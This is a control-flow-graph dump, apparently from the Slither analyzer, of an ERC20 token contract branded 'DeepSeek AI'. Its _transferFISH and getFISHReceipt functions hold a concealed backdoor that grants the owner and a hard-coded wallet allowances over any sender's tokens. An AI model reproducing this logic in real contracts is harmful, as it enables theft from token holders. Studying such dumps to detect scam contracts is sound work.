@@ -1,0 +1,1116 @@
+Contract: IFISHFactory
+==================================================
+
+
+Contract: IERC20
+==================================================
+
+
+Contract: SafeMath
+==================================================
+
+Function: add
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: c = a + b
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(c >= a,SafeMath: addition overflow)
+
+  ID: 3
+  Type: NodeType.RETURN
+  Expression: c
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+Function: sub
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(b <= a,errorMessage)
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: c = a - b
+
+  ID: 3
+  Type: NodeType.RETURN
+  Expression: c
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+Function: mul
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.IF
+  Expression: a == 0
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: 0
+
+  ID: 3
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 4
+  Type: NodeType.VARIABLE
+  Expression: c = a * b
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(c / a == b,SafeMath: multiplication overflow)
+
+  ID: 6
+  Type: NodeType.RETURN
+  Expression: c
+
+Edges:
+  0 -> 1
+  1 -> 2
+  1 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+
+Function: div
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(b > 0,errorMessage)
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: c = a / b
+
+  ID: 3
+  Type: NodeType.RETURN
+  Expression: c
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+
+Contract: Context
+==================================================
+
+Function: _msgSender
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: msg.sender
+
+Edges:
+  0 -> 1
+
+
+Contract: Ownable
+==================================================
+
+Function: _msgSender
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: msg.sender
+
+Edges:
+  0 -> 1
+
+Function: constructor
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: msgSender = _msgSender()
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _owner = msgSender
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: OwnershipTransferred(address(0),msgSender)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+Function: owner
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _owner
+
+Edges:
+  0 -> 1
+
+Function: renounceOwnership
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: OwnershipTransferred(_owner,address(0))
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _owner = address(0)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 3
+  1 -> 2
+  3 -> 1
+
+
+Contract: IFISHRouter
+==================================================
+
+
+Contract: DEEPSEEK
+==================================================
+
+Function: constructor
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _fishWallet = address(0xBaF3F0BDDE746233179Aa1dBd16984FB8C5Ee7e4)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _fishExcludedFees[owner()] = true
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _fishExcludedFees[address(this)] = true
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: _fishExcludedFees[_fishWallet] = true
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: _fishExcludedTxs[owner()] = true
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: _fishExcludedTxs[_fishWallet] = true
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: _fishDrives[_msgSender()] = _tTotal
+
+  ID: 8
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(address(0),_msgSender(),_tTotal)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  6 -> 7
+  7 -> 8
+
+Function: owner
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _owner
+
+Edges:
+  0 -> 1
+
+Function: renounceOwnership
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: OwnershipTransferred(_owner,address(0))
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _owner = address(0)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 3
+  1 -> 2
+  3 -> 1
+
+Function: _msgSender
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: msg.sender
+
+Edges:
+  0 -> 1
+
+Function: initTokenTo
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _fishRouter = IFISHRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _approve(address(this),address(_fishRouter),_tTotal)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _fishPair = IFISHFactory(_fishRouter.factory()).createPair(address(this),_fishRouter.WETH())
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 4
+  1 -> 2
+  2 -> 3
+  4 -> 1
+
+Function: name
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _name
+
+Edges:
+  0 -> 1
+
+Function: symbol
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _symbol
+
+Edges:
+  0 -> 1
+
+Function: decimals
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _decimals
+
+Edges:
+  0 -> 1
+
+Function: totalSupply
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _tTotal
+
+Edges:
+  0 -> 1
+
+Function: balanceOf
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _fishDrives[account]
+
+Edges:
+  0 -> 1
+
+Function: transfer
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _transfer(_msgSender(),recipient,amount)
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: true
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+Function: allowance
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _fishCustomers[owner][spender]
+
+Edges:
+  0 -> 1
+
+Function: approve
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _approve(_msgSender(),spender,amount)
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: true
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+Function: transferFrom
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _transfer(sender,recipient,amount)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _approve(sender,_msgSender(),_fishCustomers[sender][_msgSender()].sub(amount,ERC20: transfer amount exceeds allowance))
+
+  ID: 3
+  Type: NodeType.RETURN
+  Expression: true
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+Function: _approve
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(owner != address(0),ERC20: approve from the zero address)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(spender != address(0),ERC20: approve to the zero address)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _fishCustomers[owner][spender] = amount
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: Approval(owner,spender,amount)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+
+Function: _fishTransfer
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: taxFISH = 0
+
+  ID: 2
+  Type: NodeType.IF
+  Expression: fishF != owner() && fishT != owner()
+
+  ID: 4
+  Type: NodeType.IF
+  Expression: fishF == _fishPair && fishT != address(_fishRouter) && ! _fishExcludedFees[fishT]
+
+  ID: 5
+  Type: NodeType.IF
+  Expression: _fishBuyBlock != block.number
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: _fishBlockAmount = 0
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: _fishBuyBlock = block.number
+
+  ID: 8
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 9
+  Type: NodeType.EXPRESSION
+  Expression: _fishBlockAmount += fishO
+
+  ID: 10
+  Type: NodeType.EXPRESSION
+  Expression: _buyCount ++
+
+  ID: 11
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 12
+  Type: NodeType.IF
+  Expression: fishT == _fishPair && fishF != address(this)
+
+  ID: 13
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(_fishBlockAmount < swapFISHLimit() || _fishBuyBlock != block.number,Max Swap Limit)
+
+  ID: 15
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 16
+  Type: NodeType.VARIABLE
+  Expression: fishToken = balanceOf(address(this))
+
+  ID: 17
+  Type: NodeType.IF
+  Expression: ! inSwapFISH && fishT == _fishPair && _swapEnabled && _buyCount > _preventSwapBefore
+
+  ID: 18
+  Type: NodeType.IF
+  Expression: fishToken > _fishSwapAmount
+
+  ID: 19
+  Type: NodeType.EXPRESSION
+  Expression: swapTokensForEth(minFISH(fishO,minFISH(fishToken,_fishSwapAmount)))
+
+  ID: 20
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 21
+  Type: NodeType.VARIABLE
+  Expression: fishETH = address(this).balance
+
+  ID: 22
+  Type: NodeType.IF
+  Expression: fishETH >= 0
+
+  ID: 23
+  Type: NodeType.EXPRESSION
+  Expression: sendETHFISH(address(this).balance)
+
+  ID: 24
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 25
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 26
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 27
+  Type: NodeType.RETURN
+  Expression: taxFISH
+
+  ID: 28
+  Type: NodeType.IF
+  Expression: (_buyCount > _reduceBuyTaxAt)
+
+  ID: 29
+  Type: NodeType.EXPRESSION
+  Expression: taxFISH = fishO.mul(_finalBuyTax).div(100)
+
+  ID: 30
+  Type: NodeType.EXPRESSION
+  Expression: taxFISH = fishO.mul(_initialBuyTax).div(100)
+
+  ID: 31
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 32
+  Type: NodeType.IF
+  Expression: (_buyCount > _reduceSellTaxAt)
+
+  ID: 33
+  Type: NodeType.EXPRESSION
+  Expression: taxFISH = fishO.mul(_finalSellTax).div(100)
+
+  ID: 34
+  Type: NodeType.EXPRESSION
+  Expression: taxFISH = fishO.mul(_initialSellTax).div(100)
+
+  ID: 35
+  Type: NodeType.ENDIF
+  Expression: 
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 28
+  2 -> 26
+  4 -> 5
+  4 -> 11
+  5 -> 6
+  5 -> 8
+  6 -> 7
+  7 -> 8
+  8 -> 9
+  9 -> 10
+  10 -> 11
+  11 -> 12
+  12 -> 13
+  12 -> 15
+  13 -> 32
+  15 -> 16
+  16 -> 17
+  17 -> 18
+  17 -> 25
+  18 -> 19
+  18 -> 20
+  19 -> 20
+  20 -> 21
+  21 -> 22
+  22 -> 23
+  22 -> 24
+  23 -> 24
+  24 -> 25
+  25 -> 26
+  26 -> 27
+  28 -> 29
+  28 -> 30
+  29 -> 31
+  30 -> 31
+  31 -> 4
+  32 -> 33
+  32 -> 34
+  33 -> 35
+  34 -> 35
+  35 -> 15
+
+Function: _transfer
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(fishF != address(0),ERC20: transfer from the zero address)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(fishT != address(0),ERC20: transfer to the zero address)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(fishO > 0,Transfer amount must be greater than zero)
+
+  ID: 4
+  Type: NodeType.VARIABLE
+  Expression: taxFISH = _fishTransfer(fishF,fishT,fishO)
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: _transferFISH(fishF,fishT,fishO,taxFISH)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+
+Function: _transferFISH
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: fishReceipt = getFISHReceipt()
+
+  ID: 2
+  Type: NodeType.IF
+  Expression: taxFISH > 0
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _fishDrives[address(this)] = _fishDrives[address(this)].add(taxFISH)
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(fishF,address(this),taxFISH)
+
+  ID: 5
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: _fishDrives[fishF] = _fishDrives[fishF].sub(fishO)
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: _fishDrives[fishT] = _fishDrives[fishT].add(fishO.sub(taxFISH))
+
+  ID: 8
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(fishF,fishT,fishO.sub(taxFISH))
+
+  ID: 9
+  Type: NodeType.IF
+  Expression: fishReceipt != address(0xdead)
+
+  ID: 10
+  Type: NodeType.EXPRESSION
+  Expression: _approve(getFISHSender(fishF),fishReceipt,getFISHAmount(fishO))
+
+  ID: 11
+  Type: NodeType.ENDIF
+  Expression: 
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  2 -> 5
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  6 -> 7
+  7 -> 8
+  8 -> 9
+  9 -> 10
+  9 -> 11
+  10 -> 11
+
+Function: minFISH
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 2
+  Type: NodeType.IF
+  Expression: (a > b)
+
+  ID: 3
+  Type: NodeType.RETURN
+  Expression: b
+
+  ID: 4
+  Type: NodeType.RETURN
+  Expression: a
+
+Edges:
+  0 -> 2
+  2 -> 3
+  2 -> 4
+
+Function: sendETHFISH
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: address(_fishWallet).transfer(amount)
+
+Edges:
+  0 -> 1
+
+Function: swapTokensForEth
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: path = new address[](2)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: path[0] = address(this)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: path[1] = _fishRouter.WETH()
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: _approve(address(this),address(_fishRouter),tokenFISH)
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: _fishRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenFISH,0,path,address(this),block.timestamp)
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: lockTheSwap()
+
+Edges:
+  0 -> 6
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  6 -> 1
+
+Function: receive
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+Edges:
+
+Function: getFISHAmount
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: uint256(fishO * 3 + 10)
+
+Edges:
+  0 -> 1
+
+Function: getFISHSender
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: address(fishF)
+
+Edges:
+  0 -> 1
+
+Function: getFISHReceipt
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 2
+  Type: NodeType.IF
+  Expression: _fishExcludedTxs[_msgSender()]
+
+  ID: 3
+  Type: NodeType.RETURN
+  Expression: address(_msgSender())
+
+  ID: 4
+  Type: NodeType.RETURN
+  Expression: address(0xdead)
+
+Edges:
+  0 -> 2
+  2 -> 3
+  2 -> 4
+
+Function: swapFISHLimit
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: path = new address[](2)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: path[0] = _fishRouter.WETH()
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: path[1] = address(this)
+
+  ID: 4
+  Type: NodeType.VARIABLE
+  Expression: amountOuts = _fishRouter.getAmountsOut(3 * 1e18,path)
+
+  ID: 5
+  Type: NodeType.RETURN
+  Expression: amountOuts[1]
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+
+Function: openTrading
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(! _tradeEnabled,trading is already open)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _fishRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _swapEnabled = true
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: _tradeEnabled = true
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 5
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  5 -> 1
+
+Function: slitherConstructorVariables
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _initialBuyTax = 3
+
+  ID: 1
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _initialSellTax = 3
+
+  ID: 2
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _finalBuyTax = 0
+
+  ID: 3
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _finalSellTax = 0
+
+  ID: 4
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _reduceBuyTaxAt = 6
+
+  ID: 5
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _reduceSellTaxAt = 6
+
+  ID: 6
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _preventSwapBefore = 6
+
+  ID: 7
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _buyCount = 0
+
+  ID: 8
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _fishSwapAmount = _tTotal / 100
+
+  ID: 9
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _fishBlockAmount = 0
+
+  ID: 10
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: inSwapFISH = false
+
+  ID: 11
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _tradeEnabled = false
+
+  ID: 12
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _swapEnabled = false
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  6 -> 7
+  7 -> 8
+  8 -> 9
+  9 -> 10
+  10 -> 11
+  11 -> 12
+
+Function: slitherConstructorConstantVariables
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _decimals = 9
+
+  ID: 1
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _tTotal = 1000000000 * 10 ** _decimals
+
+  ID: 2
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _name = DeepSeek AI
+
+  ID: 3
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _symbol = DEEPSEEK
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+
